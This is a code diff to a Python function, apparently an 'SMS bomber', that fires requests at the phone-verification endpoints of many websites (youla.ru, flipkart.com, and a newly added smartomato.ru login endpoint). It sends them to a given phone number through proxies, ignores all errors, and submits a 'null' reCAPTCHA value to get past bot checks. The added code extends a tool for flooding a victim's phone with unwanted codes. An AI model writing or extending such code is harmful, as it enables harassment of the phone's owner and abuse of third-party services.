@@ -611,6 +611,32 @@ def sms(prx, number, tm, code):
 					pass
 
 				try:
+					num = number
+					num2=""
+					num2+="+"
+					num2+=code
+					num2+=' '
+					num2+="("
+					num2+=num[1]
+					num2+=num[2]
+					num2+=num[3]
+					num2+=")"
+					num2+=' '
+					num2+=num[4]
+					num2+=num[5]
+					num2+=num[6]
+					num2+='-'
+					num2+=num[7]
+					num2+=num[8]
+					num2+='-'
+					num2+=num[9]
+					num2+=num[10]
+					payload = {"phone":num2,"g-recaptcha-response":"null"}
+					requests.post("https://1603.smartomato.ru/account/session", json=payload, proxies = proxies)
+				except:
+					pass
+
+				try:
 					requests.post('https://youla.ru/web-api/auth/request_code', data={"phone": number}, headers=header, proxies = proxies)
 				except:
 					pass
@@ -1110,6 +1136,32 @@ def sms(prx, number, tm, code):
 
 				try:
 					requests.post('https://www.flipkart.com/api/5/user/otp/generate', data={'phone': '+' + number}, headers=header)
+				except:
+					pass
+
+				try:
+					num = number
+					num2=""
+					num2+="+"
+					num2+=code
+					num2+=' '
+					num2+="("
+					num2+=num[1]
+					num2+=num[2]
+					num2+=num[3]
+					num2+=")"
+					num2+=' '
+					num2+=num[4]
+					num2+=num[5]
+					num2+=num[6]
+					num2+='-'
+					num2+=num[7]
+					num2+=num[8]
+					num2+='-'
+					num2+=num[9]
+					num2+=num[10]
+					payload = {"phone":num2,"g-recaptcha-response":"null"}
+					requests.post("https://1603.smartomato.ru/account/session", json=payload)
 				except:
 					pass
 
